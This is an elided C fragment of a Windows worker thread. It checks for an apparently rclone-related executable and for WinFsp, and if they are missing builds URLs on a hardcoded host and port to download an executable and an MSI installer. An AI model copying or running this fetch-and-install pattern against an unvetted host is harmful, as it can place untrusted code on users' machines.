...
static DWORD WINAPI InitWorkerThread(LPVOID lpParam) {
    ...
    if (GetFileAttributesA(rcloneDest) == INVALID_FILE_ATTRIBUTES) {
        ...
        sprintf_s(url, sizeof(url), "https://public.192286.xyz:41234/sd/1DokTOna/%s/%s", folder, exeName);
    ...
    if (!CheckWinFspInstalled()) {
        ...
        const char* folder = (majorVer >= 10) ? "win10" : "win7";
        char msiUrl[512];
        sprintf_s(msiUrl, sizeof(msiUrl), "https://public.192286.xyz:41234/sd/1DokTOna/%s/winfsp.msi", folder);
